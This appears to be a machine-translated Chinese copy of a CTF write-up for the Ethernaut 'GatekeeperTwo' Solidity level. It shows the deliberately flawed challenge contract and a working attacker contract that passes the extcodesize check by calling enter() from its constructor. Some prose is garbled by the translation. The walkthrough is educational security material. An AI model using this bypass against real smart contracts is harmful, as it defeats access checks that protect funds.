<html>
<head>
<title>Ethernaut: GatekeeperTwo</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">以太人:GatekeeperTwo</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/ethernaut-gatekeepertwo-fce56f52f527?source=collection_archive---------47-----------------------#2022-09-02">https://medium.com/coinmonks/ethernaut-gatekeepertwo-fce56f52f527?source=collection_archive---------47-----------------------#2022-09-02</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><figure class="fi fk ir is it iu fe ff paragraph-image"><div role="button" tabindex="0" class="iv iw di ix bf iy"><div class="fe ff iq"><img src="../Images/fbff93a7b66da5d08b9ead1c9851130a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*bmvPWXGppNmbQHJD"/></div></div></figure><p id="3669" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">这个把关者带来了一些新的挑战。注册成为参赛者通过这一关。</p><p id="aa16" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">可能有帮助的事情:</p><ol class=""><li id="fd3b" class="ka kb ht jd b je jf ji jj jm kc jq kd ju ke jy kf kg kh ki dt translated">第二个入口中的assembly关键字允许一个契约访问非vanilla Solidity固有的功能。更多信息见<a class="ae kj" href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" rel="noopener ugc nofollow" target="_blank">此处</a>。这个gate中的extcodesize调用将获得给定地址的合同代码的大小——你可以在<a class="ae kj" href="https://ethereum.github.io/yellowpaper/paper.pdf" rel="noopener ugc nofollow" target="_blank">黄皮书</a>的第7节中了解更多关于如何以及何时设置的信息。</li><li id="3dd1" class="ka kb ht jd b je kk ji kl jm km jq kn ju ko jy kf kg kh ki dt translated">第三个门中的^字符是一个位运算(XOR)，在这里用于应用另一个常见的位运算。</li></ol><p id="ad00" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated"><strong class="jd hu">问题陈述:</strong>为了打败这个关卡，你必须设置<strong class="jd hu">进入者</strong>的值，这是GatekeeperTwo契约中的一个公共状态变量。该值只能通过<strong class="jd hu"> enter(bytes8 _gateKey) </strong>功能设置。这个函数有3个修饰符，必须传递它们，然后entrant的值才能按预期设置。</p><blockquote class="kp"><p id="81f0" class="kq kr ht bd ks kt ku kv kw kx ky jy ek translated"><em class="kz">修饰符gateOne(): msg.sender！= tx.origin </em></p><p id="2732" class="kq kr ht bd ks kt ku kv kw kx ky jy ek translated"><em class="kz">修饰符gate two():extcodesize(caller())= = 0</em></p><p id="0345" class="kq kr ht bd ks kt ku kv kw kx ky jy ek translated"><em class="kz">修饰符gateThree():求_gateKey的值，使得按位运算XOR的结果必须为uint64(0) — 1 </em></p></blockquote><p id="eaf9" class="pw-post-body-paragraph jb jc ht jd b je la jg jh ji lb jk jl jm lc jo jp jq ld js jt ju le jw jx jy hm dt translated"><strong class="jd hu">问题合同:</strong></p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="a783" class="lo lp ht lk b fv lq lr l ls lt">// SPDX-License-Identifier: MIT<br/>pragma solidity ^0.6.0;<br/><br/>contract GatekeeperTwo {<br/><br/>  address public entrant;<br/><br/>  modifier gateOne() {<br/>    require(msg.sender != tx.origin);<br/>    _;<br/>  }<br/><br/>  modifier gateTwo() {<br/>    uint x;<br/>    assembly { x := extcodesize(caller()) }<br/>    require(x == 0);<br/>    _;<br/>  }<br/><br/>  modifier gateThree(bytes8 _gateKey) {<br/>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);<br/>    _;<br/>  }<br/><br/>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {<br/>    entrant = tx.origin;<br/>    return true;<br/>  }<br/>}</span></pre><p id="068b" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated"><strong class="jd hu">解决方案:</strong></p><ol class=""><li id="7486" class="ka kb ht jd b je jf ji jj jm kc jq kd ju ke jy kf kg kh ki dt translated">通过创建一个AttackGateKeeperTwo契约，并从该契约调用<strong class="jd hu"> enter </strong>函数，可以很容易地传递修饰符gateOne()。这确保了tx.origin是EOA(外部拥有的帐户)，而msg.sender是AttackGateKeeperTwo合同的地址。因此，require语句msg.sender！= tx.origin成功通过。</li><li id="76e2" class="ka kb ht jd b je kk ji kl jm km jq kn ju ko jy kf kg kh ki dt translated">修饰符gateTwo()若要成功执行，协定的代码大小必须为0。你可能会想这是如何实现的？我们从AttackGateKeeperTwo契约调用<strong class="jd hu"> enter </strong>这个契约确实有代码附加在它上面，所以它的代码大小将是非零的)，你可能会得出一个结论，我们永远无法绕过修饰符gateTwo()，然而，事实并非如此。这就是坚固性的微妙之处，正如以太坊黄皮书 <em class="jz">的第<a class="ae kj" href="https://ethereum.github.io/yellowpaper/paper.pdf" rel="noopener ugc nofollow" target="_blank"> 7节所述，“在初始化代码执行期间，地址上的EXTCODESIZE应该返回零。”</a></em>因此，通过利用这种微妙性，我们从AttackGateKeeperTwo的构造函数调用<strong class="jd hu"> enter </strong>，因为在此期间，契约的代码大小返回0。这样，我们也绕过了修饰词gateTwo()。</li><li id="df54" class="ka kb ht jd b je kk ji kl jm km jq kn ju ko jy kf kg kh ki dt translated">修饰符gateThree()必须是。这是通过下面的<strong class="jd hu">实现的，因为^ b = c意味着^c = b。在我们的例子中,‘b’是‘gate key’</strong></li></ol><p id="71e3" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated"><a class="ae kj" href="https://rinkeby.etherscan.io/address/0x55de3348c0a9c6ad8006E11172b6a8e3b6a9F0ae#code" rel="noopener ugc nofollow" target="_blank">attacketekeeperter关于林克由</a>的两个合同:</p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="4d73" class="lo lp ht lk b fv lq lr l ls lt">// SPDX-License-Identifier: MIT<br/>pragma solidity ^0.6.0;<br/><br/>contract AttackGateKeeperTwo {<br/>    GatekeeperTwo gTwo = GatekeeperTwo("GateKeeperTwo Deployed Address");<br/>    event GateTwoCompromised(address who, uint256 timestamp);<br/>    /**<br/>    * modifierOne will be passed as tx.origin = EOA and msg.sender = address(this)<br/>    * modifierTwo will be passed as during contract construction the extcodesize is 0<br/>    *               Reference from YellowPaper: During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account.<br/>    * modifirerThree do calculation inside the constructor and pass it as gateKey<br/>    */<br/>    constructor() public {<br/>        // GatekeeperTwo's enter function must be called from here<br/>        // Since a ^ b = c implies a ^c = b. In our case `b` is `gateKey`<br/>        bytes8 gateKey = bytes8((uint64(0) - 1)) ^ bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));<br/>        gTwo.enter(gateKey);<br/>        emit GateTwoCompromised(address(this), block.timestamp);<br/><br/><br/>    }<br/>}</span></pre><p id="8030" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated"><strong class="jd hu">安全外卖:</strong></p><ol class=""><li id="8950" class="ka kb ht jd b je jf ji jj jm kc jq kd ju ke jy kf kg kh ki dt translated">在初始化期间，检查地址的代码大小可以为零。</li></ol><p id="e2a0" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated">如果你从这篇文章中学到了什么，请分享并关注更多这样的内容。</p></div><div class="ab cl lu lv hb lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="hm hn ho hp hq"><p id="0b78" class="pw-post-body-paragraph jb jc ht jd b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy hm dt translated"><em class="jz">原载于</em><a class="ae kj" href="https://www.linkedin.com/pulse/ethernaut-gatekeepertwo-balaji-shetty-pachai/" rel="noopener ugc nofollow" target="_blank"><em class="jz">https://www.linkedin.com</em></a><em class="jz">。</em></p><blockquote class="kp"><p id="e29e" class="kq kr ht bd ks kt ku kv kw kx ky jy ek translated">交易新手？尝试<a class="ae kj" rel="noopener" href="/coinmonks/crypto-trading-bot-c2ffce8acb2a">加密交易机器人</a>或<a class="ae kj" rel="noopener" href="/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c">复制交易</a></p></blockquote></div></div>    
</body>
</html>